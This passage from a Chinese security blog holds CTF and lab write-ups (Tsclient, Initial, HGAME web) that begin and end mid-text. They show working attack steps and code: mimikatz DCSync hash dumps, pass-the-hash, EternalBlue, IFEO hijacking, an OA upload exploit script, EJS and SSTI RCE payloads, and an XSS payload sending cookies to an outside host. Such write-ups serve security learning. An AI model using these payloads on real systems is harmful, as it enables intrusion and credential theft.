SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 这台机子不出网，我们可以通过共享文件夹的方式来传文件\n这里我是用第一台机子(172.22.8.18)，将文件夹C:/xrntkk共享给(172.22.8.46)\n在46上Win+R并输入\n\\\\172.22.8.18 输入18共享文件的账号密码即可\n接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"../assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"../assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"../assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: 